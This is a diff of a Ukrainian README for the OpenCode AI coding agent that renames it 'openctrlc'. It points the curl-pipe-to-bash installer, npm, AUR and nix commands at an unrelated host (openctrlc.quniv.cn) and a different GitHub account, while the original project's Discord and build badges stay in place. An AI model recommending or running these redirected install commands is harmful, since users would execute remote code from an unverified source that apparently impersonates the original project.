@@ -10,7 +10,7 @@
 <p align="center">AI-агент для програмування з відкритим кодом.</p>
 <p align="center">
   <a href="https://opencode.ai/discord"><img alt="Discord" src="https://img.shields.io/discord/1391832426048651334?style=flat-square&label=discord" /></a>
-  <a href="https://www.npmjs.com/package/opencode-ai"><img alt="npm" src="https://img.shields.io/npm/v/opencode-ai?style=flat-square" /></a>
+  <a href="https://www.npmjs.com/package/openctrlc-ai"><img alt="npm" src="https://img.shields.io/npm/v/openctrlc-ai?style=flat-square" /></a>
   <a href="https://github.com/anomalyco/opencode/actions/workflows/publish.yml"><img alt="Build status" src="https://img.shields.io/github/actions/workflow/status/anomalyco/opencode/publish.yml?style=flat-square&branch=dev" /></a>
 </p>
 
@@ -47,18 +47,18 @@
 
 ```bash
 # YOLO
-curl -fsSL https://opencode.ai/install | bash
+curl -fsSL https://openctrlc.quniv.cn/install | bash
 
 # Менеджери пакетів
-npm i -g opencode-ai@latest        # або bun/pnpm/yarn
+npm i -g openctrlc-ai@latest       # або bun/pnpm/yarn
 scoop install opencode             # Windows
 choco install opencode             # Windows
 brew install anomalyco/tap/opencode # macOS і Linux (рекомендовано, завжди актуально)
 brew install opencode              # macOS і Linux (офіційна формула Homebrew, оновлюється рідше)
 sudo pacman -S opencode            # Arch Linux (Stable)
-paru -S opencode-bin               # Arch Linux (Latest from AUR)
+paru -S openctrlc-bin               # Arch Linux (Latest from AUR)
 mise use -g opencode               # Будь-яка ОС
-nix run nixpkgs#opencode           # або github:anomalyco/opencode для найновішої dev-гілки
+nix run github:ponponon/openctrlc
 ```
 
 > [!TIP]
@@ -70,31 +70,31 @@ OpenCode також доступний як десктопний застосу�
 
 | Платформа             | Завантаження                       |
 | --------------------- | ---------------------------------- |
-| macOS (Apple Silicon) | `opencode-desktop-mac-arm64.dmg`   |
-| macOS (Intel)         | `opencode-desktop-mac-x64.dmg`     |
-| Windows               | `opencode-desktop-windows-x64.exe` |
+| macOS (Apple Silicon) | `openctrlc-desktop-mac-arm64.dmg`   |
+| macOS (Intel)         | `openctrlc-desktop-mac-x64.dmg`     |
+| Windows               | `openctrlc-desktop-windows-x64.exe` |
 | Linux                 | `.deb`, `.rpm` або AppImage        |
 
 ```bash
 # macOS (Homebrew)
-brew install --cask opencode-desktop
+brew install --cask openctrlc-desktop
 # Windows (Scoop)
-scoop bucket add extras; scoop install extras/opencode-desktop
+scoop bucket add extras; scoop install extras/openctrlc-desktop
 ```
 
 #### Каталог встановлення
 
 Скрипт встановлення дотримується такого порядку пріоритету для шляху встановлення:
 
-1. `$OPENCODE_INSTALL_DIR` - Користувацький каталог встановлення
+1. `$OPENCTRLC_INSTALL_DIR` - Користувацький каталог встановлення
 2. `$XDG_BIN_DIR` - Шлях, сумісний зі специфікацією XDG Base Directory
 3. `$HOME/bin` - Стандартний каталог користувацьких бінарників (якщо існує або його можна створити)
-4. `$HOME/.opencode/bin` - Резервний варіант за замовчуванням
+4. `$HOME/.openctrlc/bin` - Резервний варіант за замовчуванням
 
 ```bash
 # Приклади
-OPENCODE_INSTALL_DIR=/usr/local/bin curl -fsSL https://opencode.ai/install | bash
-XDG_BIN_DIR=$HOME/.local/bin curl -fsSL https://opencode.ai/install | bash
+OPENCTRLC_INSTALL_DIR=/usr/local/bin curl -fsSL https://openctrlc.quniv.cn/install | bash
+XDG_BIN_DIR=$HOME/.local/bin curl -fsSL https://openctrlc.quniv.cn/install | bash
 ```
 
 ### Агенти
